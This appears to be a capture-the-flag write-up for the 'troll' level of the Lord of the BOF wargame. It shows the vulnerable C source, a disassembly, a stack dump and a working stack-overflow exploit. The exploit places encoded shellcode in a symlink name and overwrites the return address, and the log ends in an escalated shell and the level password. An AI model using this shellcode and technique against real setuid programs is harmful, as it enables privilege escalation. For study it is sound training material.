# Level 7, Orge -> Troll

### troll.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}
```

### Analysis

#### Disassembling the "troll"

```
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,44
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],2
0x804850a <main+10>:    je     0x8048523 <main+35>
0x804850c <main+12>:    push   0x8048690
0x8048511 <main+17>:    call   0x8048410 <printf>
0x8048516 <main+22>:    add    %esp,4
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
0x8048520 <main+32>:    add    %esp,4
0x8048523 <main+35>:    nop
0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:    nop
0x804852c <main+44>:    lea    %esi,[%esi*1]
0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:    lea    %edx,[%eax*4]
0x804853a <main+58>:    mov    %eax,%ds:0x80497cc
0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:    jne    0x8048547 <main+71>
0x8048545 <main+69>:    jmp    0x8048587 <main+135>
0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:    lea    %edx,[%eax*4]
0x8048551 <main+81>:    mov    %eax,%ds:0x80497cc
0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:    push   %edx
0x804855a <main+90>:    call   0x80483f0 <strlen>
0x804855f <main+95>:    add    %esp,4
0x8048562 <main+98>:    mov    %eax,%eax
0x8048564 <main+100>:   push   %eax
0x8048565 <main+101>:   push   0
0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:   lea    %edx,[%eax*4]
0x8048571 <main+113>:   mov    %eax,%ds:0x80497cc
0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:   push   %edx
0x804857a <main+122>:   call   0x8048430 <memset>
0x804857f <main+127>:   add    %esp,12
0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:   jmp    0x8048530 <main+48>
0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:   add    %eax,4
0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:   add    %edx,47
0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:   je     0x80485b0 <main+176>
0x8048597 <main+151>:   push   0x80486a3
0x804859c <main+156>:   call   0x8048410 <printf>
0x80485a1 <main+161>:   add    %esp,4
0x80485a4 <main+164>:   push   0
0x80485a6 <main+166>:   call   0x8048420 <exit>
0x80485ab <main+171>:   add    %esp,4
0x80485ae <main+174>:   mov    %esi,%esi
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   push   %edx
0x80485b9 <main+185>:   call   0x80483f0 <strlen>
0x80485be <main+190>:   add    %esp,4
0x80485c1 <main+193>:   mov    %eax,%eax
0x80485c3 <main+195>:   cmp    %eax,48
0x80485c6 <main+198>:   jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:   push   0x80486c0
0x80485cd <main+205>:   call   0x8048410 <printf>
0x80485d2 <main+210>:   add    %esp,4
0x80485d5 <main+213>:   push   0
0x80485d7 <main+215>:   call   0x8048420 <exit>
0x80485dc <main+220>:   add    %esp,4
0x80485df <main+223>:   nop
0x80485e0 <main+224>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485e3 <main+227>:   add    %eax,4
0x80485e6 <main+230>:   mov    %edx,DWORD PTR [%eax]
0x80485e8 <main+232>:   push   %edx
0x80485e9 <main+233>:   lea    %eax,[%ebp-40]
0x80485ec <main+236>:   push   %eax
0x80485ed <main+237>:   call   0x8048440 <strcpy>
0x80485f2 <main+242>:   add    %esp,8
0x80485f5 <main+245>:   lea    %eax,[%ebp-40]
0x80485f8 <main+248>:   push   %eax
0x80485f9 <main+249>:   push   0x80486d7
0x80485fe <main+254>:   call   0x8048410 <printf>
0x8048603 <main+259>:   add    %esp,8
0x8048606 <main+262>:   push   40
0x8048608 <main+264>:   push   0
0x804860a <main+266>:   lea    %eax,[%ebp-40]
0x804860d <main+269>:   push   %eax
0x804860e <main+270>:   call   0x8048430 <memset>
0x8048613 <main+275>:   add    %esp,12
0x8048616 <main+278>:   mov    %eax,DWORD PTR [%ebp+12]
0x8048619 <main+281>:   add    %eax,4
0x804861c <main+284>:   mov    %edx,DWORD PTR [%eax]
0x804861e <main+286>:   push   %edx
0x804861f <main+287>:   call   0x80483f0 <strlen>
0x8048624 <main+292>:   add    %esp,4
0x8048627 <main+295>:   mov    %eax,%eax
0x8048629 <main+297>:   push   %eax
0x804862a <main+298>:   push   0
0x804862c <main+300>:   mov    %eax,DWORD PTR [%ebp+12]
0x804862f <main+303>:   add    %eax,4
0x8048632 <main+306>:   mov    %edx,DWORD PTR [%eax]
0x8048634 <main+308>:   push   %edx
0x8048635 <main+309>:   call   0x8048430 <memset>
0x804863a <main+314>:   add    %esp,12
0x804863d <main+317>:   leave
0x804863e <main+318>:   ret
```

#### Estimated Stack Structure

```
|  int i (4 bytes)            |         [%ebp-44]
|  BUFFER (40 bytes)          |         [%ebp-40]
|  SFP (4 bytes)              |         [%ebp]
|  RET (4 bytes)              |         [%ebp+4]
|  ARGC (4 bytes)             |         [%ebp+8]
|  ARGV[0] (?? bytes)         |         DWORD PTR [%ebp+12]
```

#### Observed Stack Structure (bp at *main+245)

```
0xbffffacc:     0x00000015      0x41414141      0x41414141      0x41414141  -> int i, The 'buffer[40]'
0xbffffadc:     0x41414141      0x41414141      0x41414141      0x41414141  -> The 'buffer[40]'
0xbffffaec:     0x41414141      0x41414141      0x41414141      0x41414141  -> The 'buffer[40]', SFP
0xbffffafc:     0xbfbfbfbf      0x00000000      0xbffffb44      0xbffffb50  -> RET, ARGC, ARGV Pointer
0xbffffb0c:     0x40013868      0x00000002      0x08048450      0x00000000
0xbffffb1c:     0x08048471      0x08048500      0x00000002      0xbffffb44
0xbffffb2c:     0x08048390      0x0804866c      0x4000ae60      0xbffffb3c
0xbffffb3c:     0x40013e90      0x00000002      0xbffffc40      0xbffffc54
0xbffffb4c:     0x00000000      0xbffffc85      0xbffffc94      0xbffffcad
0xbffffb5c:     0xbffffccc      0xbffffcee      0xbffffcf8      0xbffffebb
0xbffffb6c:     0xbffffeda      0xbffffef4      0xbfffff09      0xbfffff25
0xbffffb7c:     0xbfffff30      0xbfffff3d      0xbfffff45      0xbfffff56
0xbffffb8c:     0xbfffff60      0xbfffff6e      0xbfffff7f      0xbfffff8d
0xbffffb9c:     0xbfffff98      0xbfffffa8      0x00000000      0x00000003
0xbffffbac:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffbbc:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffbcc:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffbdc:     0x08048450      0x0000000b      0x000001fb      0x0000000c
0xbffffbec:     0x000001fb      0x0000000d      0x000001fb      0x0000000e
0xbffffbfc:     0x000001fb      0x00000010      0x0fabfbff      0x0000000f
0xbffffc0c:     0xbffffc3b      0x00000000      0x00000000      0x00000000
0xbffffc1c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc2c:     0x00000000      0x00000000      0x00000000      0x69000000
0xbffffc3c:     0x00363836      0x6d6f682f      0x726f2f65      0x742f6567
0xbffffc4c:     0x6c6c6f72      0x0070632d      0x41414141      0x41414141
```

### Exploit

#### How to pwn

```
1. Create a Symbolic link file with name consisting shellcode
2. Call Symbolic link consisting shellcode within its name
3. Redirect execution flow to ARGV[0]
```

#### Shellcode (48 bytes)

```
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```

#### Final Payload

```
1. Create symbolic link to the 'troll' with name consisting shellcode
ln -sf ~/troll /tmp/`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`

2. Execute symbolic link with RET overwritten ARGV[1]
./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
```

### Result

```
[orge@localhost orge]$ ln -sf ~/troll /tmp/`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[orge@localhost orge]$ cd /tmp
[orge@localhost /tmp]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\x48\xf9\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH▒▒▒
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin
```